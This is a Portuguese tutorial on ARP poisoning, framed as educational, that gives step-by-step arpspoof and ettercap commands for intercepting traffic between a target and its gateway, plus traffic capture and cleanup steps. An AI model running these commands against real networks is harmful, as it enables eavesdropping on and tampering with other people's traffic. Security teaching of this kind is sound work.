# Tutorial: Ataque de ARP Poisoning

Este tutorial apresenta o processo de **ARP Poisoning** para interceptar ou manipular o tráfego de uma rede local. **Atenção:** Realize este ataque apenas em redes de teste ou com permissão explícita, pois é uma atividade ilegal e invasiva quando realizada sem autorização.

## Pré-requisitos

- Linux com privilégios de superusuário (comando `sudo`)
- Ferramentas como `arpspoof` ou `ettercap` instaladas
- Configuração de IP Forwarding para redirecionar o tráfego

---

## Passo a Passo

### 1. Ativar IP Forwarding

Para que o tráfego possa ser redirecionado entre o alvo e o roteador, ative o **IP Forwarding**:
```bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```

Este comando habilita o redirecionamento de pacotes na máquina atacante, essencial para a continuidade da comunicação entre o alvo e o roteador durante o ataque.

### 2. Executar ARP Poisoning com `arpspoof`

Usaremos o `arpspoof` para enganar tanto o alvo quanto o roteador. Abra dois terminais, um para cada direção do ataque.

#### No Terminal 1: Falsificar o ARP entre o Alvo e o Roteador

Substitua `<IP_ALVO>` pelo endereço IP da máquina alvo e `<IP_GATEWAY>` pelo IP do roteador.
```bash
sudo arpspoof -i <interface> -t <IP_ALVO> <IP_GATEWAY>
```

#### No Terminal 2: Falsificar o ARP entre o Roteador e o Alvo

Substitua `<IP_GATEWAY>` e `<IP_ALVO>` pelos respectivos IPs do roteador e do alvo.
```bash
sudo arpspoof -i <interface> -t <IP_GATEWAY> <IP_ALVO>
```

- `<interface>`: Interface de rede (ex.: `wlan0`, `eth0`).
- `<IP_ALVO>`: Endereço IP do dispositivo alvo.
- `<IP_GATEWAY>`: Endereço IP do roteador.

Esse processo faz com que tanto o roteador quanto o alvo redirecionem pacotes para o seu dispositivo, permitindo o monitoramento do tráfego entre eles.

### 3. (Opcional) Capturar o Tráfego com `Wireshark` ou `tcpdump`

Agora que o tráfego está sendo redirecionado para a máquina atacante, você pode usar ferramentas como `Wireshark` ou `tcpdump` para capturar e analisar os pacotes. Por exemplo:

```bash
sudo tcpdump -i <interface>
```

Este comando permite visualizar pacotes trocados entre o roteador e o alvo.

### 4. (Opcional) Realizar um Ataque com `ettercap`

Como alternativa ao `arpspoof`, você pode usar o `ettercap`, que também permite realizar ARP Poisoning e capturar o tráfego de forma mais integrada:

```bash
sudo ettercap -T -M arp:remote /<IP_ALVO>/ /<IP_GATEWAY>/
```

Esse comando executa o ARP Poisoning entre o alvo e o roteador, capturando o tráfego em tempo real.

---

## Finalizando o Ataque

### 5. Restaurar as Tabelas ARP e Desativar o IP Forwarding

Ao final do ataque, é importante restaurar o comportamento normal da rede. Desative o IP Forwarding:
```bash
echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward
```

Também pode ser útil limpar o cache ARP nas máquinas afetadas ou reiniciá-las para garantir a restauração das tabelas ARP.

---

## Considerações Finais

Este tutorial deve ser utilizado somente para fins educacionais e em ambientes controlados com permissão. O uso não autorizado do ARP Poisoning é ilegal e pode ter consequências legais severas.

### Recursos e Referências

- [Documentação do arpspoof](https://linux.die.net/man/8/arpspoof)
- [Wireshark – Captura de Pacotes](https://www.wireshark.org/)
- [Ettercap para ARP Spoofing](https://www.ettercap-project.org/)

---

**Disclaimer:** Este guia é para fins educacionais. Use as ferramentas com responsabilidade.

